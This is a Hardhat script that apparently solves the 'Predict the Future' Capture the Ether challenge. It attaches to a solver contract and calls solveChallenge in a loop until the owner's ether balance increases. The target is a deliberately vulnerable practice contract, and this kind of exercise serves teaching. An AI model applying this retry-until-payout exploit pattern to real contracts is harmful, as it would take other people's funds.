const { ethers } = require('hardhat');

const DEPLOY = false;
const CHALLENGE_ADDRESS = '0xb4AbF9c03Bd0f8CCFfF209C4391B994ff5156569';
const SOLVER_ADDRESS = '0x3a712aD70de1D7FfE919be8769d49e6d7cFeDEB0';

async function main() {
  const PredictTheFutureChallengeSolver = await ethers.getContractFactory('PredictTheFutureChallengeSolver');

  let solver;
  if (DEPLOY) {
    solver = await PredictTheFutureChallengeSolver.deploy();
    await solver.deployed();
    console.log(`Solver address: ${solver.address}`);
  } else {
    solver = await PredictTheFutureChallengeSolver.attach(SOLVER_ADDRESS);
  }

  // // Step 1: lock in the guess
  // const guess = 5;
  // await solver.enterGuess(CHALLENGE_ADDRESS, guess, { value: ethers.utils.parseEther('1.0') });

  // Step 2: try until we guess
  for (let i = 0; i < 10; i++) {
    const [owner] = await ethers.getSigners();
    const oldBalance = await ethers.provider.getBalance(owner.address);
    console.log(`Old balance: ${ethers.utils.formatEther(oldBalance)}`);

    const tx = await solver.solveChallenge(CHALLENGE_ADDRESS);
    try {
      const receipt = await tx.wait();
      console.log(receipt);
    } catch (e) {}

    const newBalance = await ethers.provider.getBalance(owner.address);
    console.log(`New balance: ${ethers.utils.formatEther(newBalance)}`);

    if (newBalance.gt(oldBalance)) {
      console.log('Done!');
      break;
    } else {
      console.log('Keep going...');
    }
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
